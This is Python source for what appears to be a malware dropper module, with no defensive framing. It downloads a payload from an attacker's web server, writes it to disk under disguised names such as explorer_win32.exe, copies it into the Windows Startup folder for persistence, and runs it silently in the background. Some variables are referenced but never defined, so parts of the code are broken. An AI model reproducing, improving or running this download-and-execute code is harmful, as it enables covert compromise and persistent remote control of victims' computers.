############ *_* TO note *_* ################
# run: python -m SimpleHTTPServer ###########
# The the directory from which you run that #
# command become the web directory, so move #
# files to that dir.                        #
# To check: firefox http://127.0.0.1:8000   #
#############################################

import base64
import ctypes
import os
import time

#TODO. Check if we have python27 or python3 run this script to know which module to import !!
try:
    import urllib3
except:
    if os.name == 'nt':
        os.system("pip install urllib3")
    elif os.name == 'posix':
        os.system("pip3.6 install urllib3>/dev/null")
    import urllib3

# retrieve the shellcode from our web server
#"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
#TODO: use free FTP server
bin = False
ScriptExec = "python3.5 " # "./"  #cmd= "./{}".format(OsTargetpath)
url = "http://192.168.2.112:8000/TCP_client.py"
OsTargetpath = ".payload_posix"
shellcode = ""
start = True #To decide entweder an oder aus die Zugriff
winRunOnBoot=True
linRunOnBoot=False

def run(**args):
    #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
    print('[*] In getFileFromURI module.')
    global bin, url, ScriptExec, OsTargetpath, shellcode
    if os.name == 'nt':
        bin = True
        ScriptExec = "python"
        url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
        OsTargetpath = os.getenv("PUBLIC")+ "\explorer_win32.exe"

    elif os.name == 'posix':
        bin = True
        ScriptExec = "python3.6 "
        url = "http://192.168.2.112:8000/lk_debian"   #"http://saw-dsr.ddns.net:8000/TCP_client.py"
        OsTargetpath = ".lk_debian"
        #TODO if linRunOnBoot:
    else:
        return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)

    try:
        http = urllib3.PoolManager()
        #The HTTPResponse object provides status, data, and header attributes:
        r = http.request('GET', url)
        #The data attribute of the response is always set to a byte string representing the response content
        shellcode = r.data
        #print(r.status)
    except urllib3.exceptions.MaxRetryError:
    	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
    	return "getFileFromURI: HTTP Error 404: File not found"
    except urllib3.exceptions.URLError:
    	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
    	return "getFileFromURI: Connection refused"
    if r.status == 404:
        return "getFileFromURI: HTTP Error 404: File not found"

    try:
        mon_fichier = open(OsTargetpath, "wb")

        mon_fichier.write(shellcode)
        mon_fichier.close()
        print(r.status, "************File succ closely ***********")
        if os.name == 'nt' and winRunOnBoot == True:
            startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
            print(shellcode)
            os.system("copy /Y %s \"%s\""%(targetPath, startPath))
    except:
        print("[Error] getFileFromURI: could not create OsTargetpath")
        return " modules/_bootlocale not found!!"

    if start and os.name == 'nt': #TODO: check how to start python script
        if bin:
            os.system("start {}".format(OsTargetpath))
        else:
            os.system(scriptExec+" "+OsTargetpath)
    elif start and os.name == 'posix':
          os.system("chmod 755 {}".format(OsTargetpath))
          os.system("./"+OsTargetpath +" >/dev/null &")
    else:
          return ("Script is Stored under {} but never started".format(OsTargetpath))

    time.sleep(1)
    return str("getFileFromURI: file {} successfully started".format(OsTargetpath))


run()
  #while not is_connected(): #if the tro execute this, so it is already connected
  #time.sleep(20)
import socket
REMOTE_SERVER = "www.google.com"
def is_connected(hostname):
  try:
    # see if we can resolve the host name: if there is a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host: if the host is actually reachable
    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False
